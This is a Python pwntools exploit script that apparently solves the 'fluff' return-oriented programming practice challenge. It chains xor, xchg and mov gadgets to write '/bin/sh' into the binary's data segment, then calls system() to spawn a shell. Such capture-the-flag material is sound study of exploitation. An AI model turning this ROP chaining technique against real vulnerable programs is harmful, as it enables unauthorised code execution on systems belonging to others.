#!/usr/bin/env python2

import pwn

t = pwn.process("./fluff")

pwn.gdb.attach(t)

popRDI = 0x4008c3
data_seg = 0x6010d0
system_plt = 0x4005e0
clearR11 = 0x400822 #xor r11, r11; pop r14; mov edi, junk; ret;
xorGadget = 0x40082f # xor r11, r12; pop r12; mov r13d, 'junk'; ret;
xchg = 0x400840 # xchg r11, r10; pop r15; mov r11d, junk; ret;
movGadget = 0x40084e #mov qword [r10], r11; pop r13; pop r12; xor byte [r10], r12b; ret;
popR12 = 0x400832 # pop r12; mov r13d, junk; ret;

buf = 'h'*40

#clear r11 so when I call xorGadget r11 will get r12's value
buf += pwn.p64(clearR11)
buf += 'junkjunk' #goes in to r14

#pop data_seg to r12 (value I want in r10)  xor it to r11 to xchg with r10
buf += pwn.p64(popR12)
buf += pwn.p64(data_seg)
buf += pwn.p64(xorGadget)
buf += '/bin/sh\x00'  # there is a pop r12 after the xor so I dont have to pop r12 again.
buf += pwn.p64(xchg)
buf += 'junkjunk'    # r15 doesnt matter

#clear r11 to xor with r12 which already has the value I want in r11
buf += pwn.p64(clearR11)
buf += 'junkjunk'   #r14 doesnt matter
buf += pwn.p64(xorGadget)
buf += 'junkjunk'   #I dont care about r12 right now
buf += pwn.p64(movGadget)
buf += 'junkjunk'   #r13 is irrelevant
buf += pwn.p64(0)   #r12 needs to be zero for the xor in the next instruction


#call system with /bin/sh as argument
buf += pwn.p64(popRDI)
buf += pwn.p64(data_seg)
buf += pwn.p64(system_plt)

t.sendline(buf)
t.interactive()
